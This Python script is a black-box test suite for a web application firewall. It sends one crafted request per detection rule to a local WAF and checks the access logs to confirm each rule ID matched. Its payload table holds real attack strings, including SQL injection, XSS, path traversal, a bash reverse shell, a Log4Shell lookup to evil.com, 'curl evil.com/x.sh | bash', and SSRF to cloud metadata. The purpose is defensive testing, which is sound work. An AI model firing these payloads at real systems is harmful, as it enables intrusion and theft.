#!/usr/bin/env python3
"""
Black-box test: fire one crafted request per rule in configs/rules/all_rules.json
and verify — via the access-log API — that the EXACT rule ID matched.

Each rule gets its own spoofed source IP (X-Forwarded-For, same trick as
test_autoban.py) so its access-log entry can be looked up unambiguously via
GET /waf-api/logs?ip=<ip> (a public, no-auth endpoint — see handlers.go).
This proves the rule's own detect pattern fired, not just that "some rule"
blocked the request.

78 rules total. Two are score-0 "behavioral" counters (WAF-110/111) that only
add score after N repeats in a time window — but the pattern itself ("path
starts with /") matches on the FIRST request, so a single POST is enough to
prove the rule engine evaluated and matched them. WAF-200-ML-GRAYZONE is a
"when.min_score/max_score" gated rule (fires only while the running total is
in [3, 7)); it's tested by combining a small, deterministic SQLi hit
(WAF-007, score 3, no ml_confirm) with a non-empty POST body in one request.

Run against a live WAF (defaults to the local one):
    .venv/bin/python scripts/test_all_rules.py
    .venv/bin/python scripts/test_all_rules.py --url http://localhost:8081 --admin-url http://localhost:8080
    .venv/bin/python scripts/test_all_rules.py --only WAF-0        # filter by ID prefix
    .venv/bin/python scripts/test_all_rules.py --list               # show payload table, don't fire

Exit code 0 = every targeted rule matched, 1 = at least one didn't (CI-friendly).
"""

from __future__ import annotations

import argparse
import sys
import time

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

DEFAULT_UA = "waf-rule-test/1.0"

# =============================================================================
# Rule → trigger-request table
#
# Fields:
#   id, category, method, path
#   params      — dict, requests.get()-style (auto url-encoded; safe when the
#                 rule's transforms include url_decode, since decode reverses
#                 the encoding losslessly)
#   raw_query   — literal query string appended straight to the URL, bypassing
#                 requests' auto-encoding entirely. Required for rules whose
#                 transforms DON'T include url_decode — they inspect the
#                 still-percent-encoded text, so we must send the percent
#                 signs verbatim (e.g. IND-LFI-002, IND-LFI-005, IND-GEN-001/002).
#   data        — POST body: dict (form-encoded) or raw string
#   content_type— overrides Content-Type when `data` is a raw string
#   headers     — extra headers (custom header injection, User-Agent, etc.)
# =============================================================================

RULES = [
    # --- SQL Injection (7) ---------------------------------------------------
    dict(id="WAF-001-SQLI-UNION", category="sqli", method="GET", path="/",
         params={"q": "1 UNION SELECT 1,2,3--"}),
    dict(id="WAF-002-SQLI-BOOLEAN-OR", category="sqli", method="GET", path="/",
         params={"q": "1 OR 1=1"}),
    dict(id="WAF-003-SQLI-TIMEBASED", category="sqli", method="GET", path="/",
         params={"q": "1 AND SLEEP(5)"}),
    dict(id="WAF-004-SQLI-ERROR-BASED", category="sqli", method="GET", path="/",
         params={"q": "extractvalue(1,concat(0x7e,version()))"}),
    dict(id="WAF-005-SQLI-STACKED", category="sqli", method="GET", path="/",
         params={"q": "1); DROP TABLE users--"}),
    dict(id="WAF-006-SQLI-COMMENT-EVASION", category="sqli", method="GET", path="/",
         params={"q": "/*!50000SELECT*/ 1"}),
    dict(id="WAF-007-SQLI-ORDERBY", category="sqli", method="GET", path="/",
         params={"q": "1 order by 5--"}),

    # --- XSS (6) ---------------------------------------------------------------
    dict(id="WAF-010-XSS-SCRIPT-TAG", category="xss", method="GET", path="/",
         params={"q": "<script>alert(1)</script>"}),
    dict(id="WAF-011-XSS-EVENT-HANDLER", category="xss", method="GET", path="/",
         params={"q": "<img src=x onerror=alert(1)>"}),
    dict(id="WAF-012-XSS-JS-URI", category="xss", method="GET", path="/",
         params={"q": "javascript:alert(1)"}),
    dict(id="WAF-013-XSS-IFRAME-SVG", category="xss", method="GET", path="/",
         params={"q": "<iframe src=x></iframe>"}),
    dict(id="WAF-014-XSS-ENCODED", category="xss", method="GET", path="/",
         params={"q": r"\x3cscript"}),
    dict(id="WAF-015-XSS-DOM-SINKS", category="xss", method="GET", path="/",
         params={"q": "document.cookie"}),

    # --- LFI / Path Traversal (4) -----------------------------------------------
    dict(id="WAF-020-LFI-DOTDOT", category="lfi", method="GET", path="/",
         params={"q": "../../../../etc/passwd"}),
    dict(id="WAF-021-LFI-SENSITIVE-FILES", category="lfi", method="GET", path="/",
         params={"q": "/etc/passwd"}),
    dict(id="WAF-022-LFI-PHP-WRAPPER", category="lfi", method="GET", path="/",
         params={"q": "php://filter/convert.base64-encode/resource=index.php"}),
    dict(id="WAF-023-LFI-LOG-POISONING", category="lfi", method="GET", path="/",
         params={"q": "../../../var/log/apache2/access.log"}),

    # --- RCE / SSTI (9) ----------------------------------------------------------
    dict(id="WAF-030-RCE-SHELL-CMDS", category="rce", method="GET", path="/",
         params={"q": "; whoami"}),
    dict(id="WAF-031-RCE-WINDOWS-CMDS", category="rce", method="GET", path="/",
         params={"q": "cmd.exe /c dir"}),
    dict(id="WAF-032-RCE-PHP-FUNCTIONS", category="rce", method="GET", path="/",
         params={"q": "system(id)"}),
    dict(id="WAF-033-RCE-REVERSE-SHELL", category="rce", method="GET", path="/",
         params={"q": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"}),
    dict(id="WAF-034-RCE-CHAR-SEPARATORS", category="rce", method="GET", path="/",
         params={"q": "; cat /etc/passwd"}),
    dict(id="WAF-035-RCE-LOG4SHELL", category="rce", method="GET", path="/",
         params={"q": "${jndi:ldap://evil.com/a}"}),
    # NOTE: the rule's own regex is `[\w]*` between the braces (word chars
    # only) — the textbook Shellshock "() { :; };" has a colon, which is NOT
    # a \w char and so does NOT match this rule as written. Use a payload
    # the actual pattern matches.
    dict(id="WAF-036-RCE-SHELLSHOCK", category="rce", method="GET", path="/",
         params={"q": "harmless"},
         headers={"X-Shellshock-Test": "() { true; }; echo vulnerable"}),
    dict(id="WAF-070-SSTI-TEMPLATE-EXPR", category="rce", method="GET", path="/",
         params={"q": "{{self.__class__}}"}),
    dict(id="WAF-071-SSTI-JINJA-INTROSPECT", category="rce", method="GET", path="/",
         params={"q": "__class__"}),

    # --- SSRF (3) ------------------------------------------------------------------
    dict(id="WAF-040-SSRF-INTERNAL-IPS", category="ssrf", method="GET", path="/",
         params={"q": "http://192.168.1.1/admin"}),
    dict(id="WAF-041-SSRF-CLOUD-METADATA", category="ssrf", method="GET", path="/",
         params={"q": "http://169.254.169.254/latest/meta-data/"}),
    dict(id="WAF-042-SSRF-DANGEROUS-SCHEMES", category="ssrf", method="GET", path="/",
         params={"q": "gopher://127.0.0.1:6379/_INFO"}),

    # --- XXE (2, body-only) -----------------------------------------------------------
    dict(id="WAF-050-XXE-DOCTYPE-EXTERNAL", category="xxe", method="POST", path="/file-upload",
         data='<?xml version="1.0"?><!DOCTYPE foo SYSTEM "file:///etc/passwd"><foo>&xxe;</foo>',
         content_type="application/xml"),
    dict(id="WAF-051-XXE-PARAMETER-ENTITY", category="xxe", method="POST", path="/file-upload",
         data='<!DOCTYPE foo [<!ENTITY % xxe "test">]><foo/>',
         content_type="application/xml"),

    # --- NoSQL Injection (2) -------------------------------------------------------
    dict(id="WAF-060-NOSQLI-MONGO-OPERATORS", category="nosqli", method="GET", path="/",
         raw_query="q[$ne]=1"),
    dict(id="WAF-061-NOSQLI-JSON-PAYLOAD", category="nosqli", method="GET", path="/",
         raw_query='q={"$ne":1}'),

    # --- Scanner / Bot (3) -----------------------------------------------------------
    dict(id="WAF-080-SCANNER-UA", category="scanner", method="GET", path="/",
         headers={"User-Agent": "sqlmap/1.7.2"}),
    dict(id="WAF-081-SCANNER-PROBE-PATHS", category="scanner", method="GET",
         path="/wp-admin/install.php"),
    dict(id="WAF-082-BOT-NO-ACCEPT-LANG", category="bot", method="GET", path="/"),

    # --- Information Leakage (5) ------------------------------------------------------
    dict(id="WAF-090-SENSITIVE-DOTFILES", category="info_leak", method="GET", path="/.env"),
    dict(id="WAF-091-SENSITIVE-BACKUP", category="info_leak", method="GET", path="/config.php.bak"),
    dict(id="WAF-092-SENSITIVE-CONFIG-FILES", category="info_leak", method="GET", path="/web.config"),
    dict(id="WAF-100-HEADER-CRLF-INJECTION", category="info_leak", method="GET", path="/",
         params={"x": "foo\r\nSet-Cookie: evil=1"}),
    dict(id="WAF-101-PROTOCOL-VIOLATION", category="info_leak", method="GET", path="/",
         params={"x": "A" * 4200}),

    # --- DoS (1) ------------------------------------------------------------------------
    dict(id="WAF-102-HEADER-OVERSIZE", category="dos", method="GET", path="/",
         headers={"X-Test-Oversize": "A" * 8300}),

    # --- Account Takeover / behavioral (2, score 0 — pattern still matches once) --------
    dict(id="WAF-110-ATO-LOGIN-BRUTE", category="ato", method="POST", path="/login",
         data={"username": "admin", "password": "wrong"}),
    dict(id="WAF-111-ATO-PWD-RESET-ABUSE", category="ato", method="POST", path="/reset",
         data={"email": "victim@example.com"}),

    # --- Indicators: XSS (6, weak/anomaly-scoring signals) -------------------------------
    dict(id="IND-XSS-001-ANGLE-TAG", category="xss", method="GET", path="/",
         params={"q": "<b>hello</b>"}),
    dict(id="IND-XSS-002-SCRIPT-WORD", category="xss", method="GET", path="/",
         params={"q": "script"}),
    dict(id="IND-XSS-003-EVENT-HANDLER", category="xss", method="GET", path="/",
         params={"q": "onmouseover=alert(1)"}),
    # wordlist matches require a word-boundary (non-alnum) char on BOTH sides
    # of the matched word — "vbscript:msgbox(1)" fails because 'm' right
    # after the colon is alnum. Space it out so the boundary holds.
    dict(id="IND-XSS-004-JS-SCHEME", category="xss", method="GET", path="/",
         params={"q": "vbscript: msgbox(1)"}),
    # same boundary issue: "alert(" followed by alnum "1" fails; "alert()"
    # is followed by ")" (non-alnum) so the boundary check passes.
    dict(id="IND-XSS-005-SINK-FN", category="xss", method="GET", path="/",
         params={"q": "alert()"}),
    dict(id="IND-XSS-006-HTML-ENTITY", category="xss", method="GET", path="/",
         params={"q": "&#x41;&#x42;"}),

    # --- Indicators: SQLi (6) -------------------------------------------------------------
    dict(id="IND-SQLI-001-QUOTE-OP", category="sqli", method="GET", path="/",
         params={"q": "' or 1"}),
    dict(id="IND-SQLI-002-KEYWORD-COMBO", category="sqli", method="GET", path="/",
         params={"q": "select name from users"}),
    dict(id="IND-SQLI-003-META-FN", category="sqli", method="GET", path="/",
         params={"q": "information_schema"}),
    dict(id="IND-SQLI-004-TAUTOLOGY", category="sqli", method="GET", path="/",
         params={"q": "1 or 1=1"}),
    # "sleep(5)" fails the wordlist boundary check ('5' after '(' is alnum);
    # "sleep()" is followed by ')' so the boundary holds.
    dict(id="IND-SQLI-005-TIME-FN", category="sqli", method="GET", path="/",
         params={"q": "sleep()"}),
    dict(id="IND-SQLI-006-COMMENT", category="sqli", method="GET", path="/",
         params={"q": "foo -- bar"}),

    # --- Indicators: LFI (6) ----------------------------------------------------------------
    dict(id="IND-LFI-001-DOTDOT", category="lfi", method="GET", path="/",
         params={"q": "../secret"}),
    # internal/normalizer/normalizer.go multi-decodes the query up to 3
    # ROUNDS before ANY rule sees it (regardless of that rule's own
    # "transforms" list) — a single %2f always resolves to a literal '/'
    # before this rule runs. To leave a literal "%2f" behind we need one
    # extra %25-layer per round: %2525252f -> (3 rounds) -> %2f.
    dict(id="IND-LFI-002-ENCODED-DOTDOT", category="lfi", method="GET", path="/",
         raw_query="q=..%2525252f"),
    dict(id="IND-LFI-003-SENSITIVE-PATH", category="lfi", method="GET", path="/",
         params={"q": "/etc/passwd"}),
    # "php://filter" fails the wordlist boundary ('f' after '://' is alnum);
    # a space keeps the boundary non-alnum.
    dict(id="IND-LFI-004-PHP-WRAPPER", category="lfi", method="GET", path="/",
         params={"q": "php:// filter"}),
    dict(id="IND-LFI-005-NULLBYTE", category="lfi", method="GET", path="/",
         raw_query="q=shell.php%00.jpg"),
    dict(id="IND-LFI-006-ABS-PATH", category="lfi", method="GET", path="/",
         params={"q": "/etc/shadow"}),

    # --- Indicators: RCE (6) -----------------------------------------------------------------
    dict(id="IND-RCE-001-METACHAR", category="rce", method="GET", path="/",
         params={"q": "&& id"}),
    dict(id="IND-RCE-002-CMD-COMMON", category="rce", method="GET", path="/",
         params={"q": "wget http://evil.com/x"}),
    dict(id="IND-RCE-003-CMD-RECON", category="rce", method="GET", path="/",
         params={"q": "whoami"}),
    dict(id="IND-RCE-004-CMD-SUBST", category="rce", method="GET", path="/",
         params={"q": "$(id)"}),
    # "system(id)" fails the wordlist boundary ('i' after '(' is alnum);
    # "system()" is followed by ')'.
    dict(id="IND-RCE-005-PHP-FN", category="rce", method="GET", path="/",
         params={"q": "system()"}),
    dict(id="IND-RCE-006-PIPE-SHELL", category="rce", method="GET", path="/",
         params={"q": "curl evil.com/x.sh | bash"}),

    # --- Indicators: SSRF (3) ------------------------------------------------------------------
    dict(id="IND-SSRF-001-INTERNAL-IP", category="ssrf", method="GET", path="/",
         params={"q": "http://192.168.0.1/"}),
    dict(id="IND-SSRF-002-URL-SCHEME", category="ssrf", method="GET", path="/",
         params={"q": "https://example.com"}),
    dict(id="IND-SSRF-003-CLOUD-META", category="ssrf", method="GET", path="/",
         params={"q": "http://169.254.169.254/latest/meta-data/hostname"}),

    # --- Indicators: generic (6) ----------------------------------------------------------------
    # See IND-LFI-002-ENCODED-DOTDOT above: the normalizer always fully
    # decodes up to 3 rounds first, so a plain "%00" becomes an actual NUL
    # byte before this rule runs (this rule's pattern has no \x00 byte-level
    # alternative, only literal "%00"/"%2500" text — unlike IND-LFI-005). One
    # extra %25-layer per round survives as literal "%00" text after 3 rounds.
    dict(id="IND-GEN-001-NULL-BYTE", category="custom", method="GET", path="/",
         raw_query="f=test%25252500.jpg"),
    dict(id="IND-GEN-002-OVER-ENCODING", category="custom", method="GET", path="/",
         raw_query="x=%25252541%25252542%25252543%25252544%25252545%25252546%25252547%25252548"),
    dict(id="IND-GEN-003-HEX-OBFUSCATION", category="custom", method="GET", path="/",
         params={"q": r"\x41\x41\x41\x41"}),
    dict(id="IND-GEN-004-TEMPLATE-EXPR", category="rce", method="GET", path="/",
         params={"q": "{{7*7}}"}),
    dict(id="IND-GEN-005-SCAN-PATH", category="scanner", method="GET", path="/backup/dump.sql"),
    dict(id="IND-GEN-006-SUSPICIOUS-UA", category="scanner", method="GET", path="/",
         headers={"User-Agent": "python-requests/2.31.0"}),
]

# WAF-200-ML-GRAYZONE is "when"-gated on the running score (3.0 <= total < 7.0)
# rather than on its own detect pattern (which is just "body non-empty"). We
# trigger it by combining WAF-007 (order-by SQLi, score 3, no ml_confirm — so
# no ML-driven variance) with a non-empty POST body, in a single request.
GRAYZONE_RULE = dict(
    id="WAF-200-ML-GRAYZONE", category="custom", method="POST", path="/",
    params={"q": "1 order by 5--"}, data={"note": "x"},
)

_passed = 0
_failed = 0


def check(cond: bool, label: str) -> None:
    global _passed, _failed
    if cond:
        _passed += 1
        print(f"  \033[32mPASS\033[0m  {label}")
    else:
        _failed += 1
        print(f"  \033[31mFAIL\033[0m  {label}")


def fire(base: str, rule: dict, ip: str) -> int:
    """Send the rule's trigger request from a unique spoofed source IP."""
    headers = {"X-Forwarded-For": ip, "User-Agent": DEFAULT_UA}
    headers.update(rule.get("headers", {}))

    if rule.get("raw_query"):
        url = base.rstrip("/") + rule["path"] + "?" + rule["raw_query"]
        params = None
    else:
        url = base.rstrip("/") + rule["path"]
        params = rule.get("params")

    data = rule.get("data")
    if isinstance(data, str):
        headers.setdefault("Content-Type", rule.get("content_type", "text/plain"))

    try:
        r = requests.request(
            rule["method"], url, params=params, data=data,
            headers=headers, timeout=10, verify=False, allow_redirects=False,
        )
        return r.status_code
    except requests.exceptions.RequestException as e:
        print(f"    (request error: {e.__class__.__name__})")
        return -1


def rule_matched(admin: str, ip: str, rule_id: str) -> bool:
    """Poll /waf-api/logs?ip=<ip> (public endpoint) for this rule ID."""
    for attempt in range(3):
        try:
            r = requests.get(admin.rstrip("/") + "/waf-api/logs",
                              params={"ip": ip, "per_page": 5}, timeout=10, verify=False)
            if r.ok:
                for entry in r.json().get("logs", []):
                    for m in entry.get("matched_rules", []):
                        if m.get("rule_id") == rule_id:
                            return True
        except (requests.exceptions.RequestException, ValueError):
            pass
        time.sleep(0.15)
    return False


def run(base: str, admin: str, rules: list) -> None:
    print(f"Traffic (data plane): {base}   Admin (control plane): {admin}")
    print(f"Targeting {len(rules)} rule(s)\n")

    for i, rule in enumerate(rules):
        if rule["id"] == GRAYZONE_RULE["id"]:
            print("Special case: WAF-200-ML-GRAYZONE (score-gated, not pattern-only)")
        ip = f"203.0.113.{(i % 250) + 2}"
        status = fire(base, rule, ip)
        matched = rule_matched(admin, ip, rule["id"])
        label = f"[{rule['category']:<9}] {rule['id']:<32} (http {status})"
        check(matched, label)


def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(description="Fire one request per WAF rule and verify it matched")
    p.add_argument("--url", default="http://localhost:8081",
                    help="WAF DATA-plane URL — protected traffic (default: %(default)s)")
    p.add_argument("--admin-url", default="http://localhost:8080",
                    help="WAF CONTROL-plane URL — /waf-api/* (default: %(default)s)")
    p.add_argument("--only", default=None,
                    help="Only run rules whose ID starts with this prefix (e.g. WAF-0, IND-SQLI)")
    p.add_argument("--list", action="store_true",
                    help="Print the payload table and exit without firing any requests")
    return p.parse_args()


def main() -> int:
    args = parse_args()
    rules = RULES + [GRAYZONE_RULE] if not args.only else \
        [r for r in RULES + [GRAYZONE_RULE] if r["id"].startswith(args.only)]

    if args.list:
        for r in rules:
            payload = r.get("raw_query") or r.get("params") or r.get("data") or r.get("headers")
            print(f"{r['id']:<32} [{r['category']:<9}] {r['method']:<4} {r['path']:<20} {payload}")
        return 0

    try:
        requests.get(args.admin_url.rstrip("/") + "/waf-api/stats", timeout=5, verify=False)
    except requests.exceptions.RequestException as e:
        print(f"Error: cannot reach WAF admin API at {args.admin_url} ({e.__class__.__name__})")
        print("Hint: is the WAF running ('make run')?")
        return 1

    if not rules:
        print(f"No rules match --only {args.only!r}")
        return 1

    run(args.url, args.admin_url, rules)

    bar = "-" * 60
    print(f"\n{bar}\nResult: {_passed} passed, {_failed} failed (of {_passed + _failed} rules)\n{bar}")
    return 0 if _failed == 0 else 1


if __name__ == "__main__":
    sys.exit(main())
